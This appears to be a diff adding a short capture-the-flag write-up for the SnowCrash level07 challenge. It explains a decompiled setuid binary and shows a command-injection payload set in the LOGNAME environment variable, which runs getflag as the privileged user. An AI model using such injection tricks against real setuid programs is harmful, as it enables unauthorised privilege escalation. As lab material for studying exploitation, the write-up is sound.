@@ -1,0 +1,28 @@
+we decompiled the file level07 using the same website https://dogbolt.org/
+and found few things inside the main function that will help us
+
+getegid() and geteuid() are functions used to retrieve the effective group ID and effective user ID of the current process, respectively.
+
+getegid(): This function returns the effective group ID (GID) of the current process.
+geteuid(): This function returns the effective user ID (UID) of the current process.
+In the code snippet, these functions are called to retrieve the effective group and user IDs and store them in variables v2 and v3, respectively.
+
+The subsequent calls to setresgid() and setresuid() are used to set the real, effective, and saved group and user IDs of the current process.
+In this case, they are setting both the real and effective group and user IDs to the values obtained from getegid() and geteuid(), effectively changing the group and user context of the current process.
+
+and since the executable belongs to the user flag07, it will escalate the previliges and execute the program as flag07
+so we found that he is trying to execute echo with whatever is LOGNAME
+
+level07@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
+
+level07@SnowCrash:~$ export LOGNAME="none | getflag"
+
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXX
